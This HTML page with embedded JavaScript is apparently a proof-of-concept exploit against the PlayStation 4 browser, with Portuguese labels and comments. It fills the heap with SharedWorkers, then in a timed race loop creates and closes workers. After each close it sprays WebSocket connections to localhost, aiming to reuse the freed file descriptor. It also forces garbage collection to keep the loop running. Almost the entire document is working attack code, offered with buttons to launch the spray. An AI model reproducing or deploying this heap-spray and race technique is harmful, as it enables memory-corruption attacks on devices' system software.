<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebSocket Spray PoC</title>
    
</head>
<body>

    <h1>SharedWorker -> WebSocket Spray</h1>
    
    <div class="panel">
        <h3>1. Preparação</h3>
        <label>Base (Recomendado 300): <input type="number" id="fillAmount" value="300"></label>
        <button id="btnFill" onclick="startFill()">ENCHER HEAP</button>
    </div>

    <div class="panel">
        <h3>2. Ataque (Socket Spray)</h3>
        <p>Tenta substituir o Worker por Sockets Reais.</p>
        <button id="btnSpray" onclick="startSpray()" disabled>INICIAR SPRAY (WS)</button>
        <button onclick="stopSpray()">PARAR</button>
    </div>

    <div id="log">Logs do sistema...</div>

    <script>
        const logEl = document.getElementById('log');
        let workers = []; 
        let sockets = []; // Segura os sockets do spray
        let raceInterval = null;
        
        function log(msg) {
            const time = new Date().toLocaleTimeString().split(' ')[0];
            logEl.innerHTML = `[${time}] ${msg}\n` + logEl.innerHTML;
        }

        // --- FASE 1: ENCHIMENTO (BASE) ---
        async function startFill() {
            const limit = parseInt(document.getElementById('fillAmount').value);
            document.getElementById('btnFill').disabled = true;
            log(`Enchendo base com ${limit} workers...`);

            let count = 0;
            const batch = setInterval(() => {
                for(let i=0; i<10; i++) {
                    if(count >= limit) {
                        clearInterval(batch);
                        log("Base pronta. Sistema estabilizado.");
                        document.getElementById('btnSpray').disabled = false;
                        return;
                    }
                    try {
                        const id = `base_${count}`;
                        const sw = new SharedWorker("data:text/javascript,onconnect=e=>{}", id);
                        sw.port.start();
                        workers.push(sw);
                        count++;
                    } catch(e) {
                        clearInterval(batch);
                        log("Erro no enchimento: " + e.message);
                    }
                }
                if(count % 50 === 0) log(`Base: ${count}/${limit}`);
            }, 20);
        }

        // --- LIMPEZA FORÇADA (GC PRESSURE) ---
        function forceGC() {
            // Aloca um array gigante de lixo para forçar o navegador a rodar o Garbage Collector
            // e limpar os workers mortos do Kernel.
            let garbage = new Array(100000).fill(0.1);
            garbage = null; // Libera imediatamente
        }

        // --- FASE 2: SPRAY COM WEBSOCKETS ---
        function startSpray() {
            if(raceInterval) return;
            log("!!! INICIANDO SOCKET SPRAY !!!");
            
            let cycle = 0;
            
            raceInterval = setInterval(() => {
                cycle++;
                const id = `race_ws_${Date.now()}_${cycle}`;
                
                try {
                    // 1. ALOCA
                    const sw = new SharedWorker("data:text/javascript,onconnect=e=>{}", id);
                    const port = sw.port;
                    
                    // 2. GATILHO
                    port.postMessage("ping"); 

                    // 3. LIBERAÇÃO
                    port.close();
                    
                    // 4. SPRAY (Munição Pesada: WebSockets)
                    // Tenta roubar o File Descriptor do worker que acabou de fechar
                    for(let i=0; i < 4; i++) {
                        // Conecta a uma porta local (não precisa existir, o importante é a syscall 'socket')
                        // Usamos portas aleatórias para evitar cache
                        const ws = new WebSocket(`ws://127.0.0.1:${8000 + i + (cycle%100)}`);
                        
                        // Mantemos o socket vivo brevemente
                        sockets.push(ws);
                        
                        // Limpa sockets antigos para não estourar a RAM (mantém apenas os últimos 50)
                        if(sockets.length > 50) {
                            const old = sockets.shift();
                            old.close();
                        }
                    }

                } catch(e) {}

                // A cada 200 ciclos, tentamos forçar o GC para evitar o crash de 3000
                if(cycle % 200 === 0) {
                    forceGC();
                    log(`Ciclo ${cycle}: Limpando zumbis...`);
                }

            }, 10); // Intervalo um pouco maior para dar tempo ao socket
        }

        function stopSpray() {
            clearInterval(raceInterval);
            raceInterval = null;
            log("Ataque parado.");
        }
    </script>
</body>
</html>
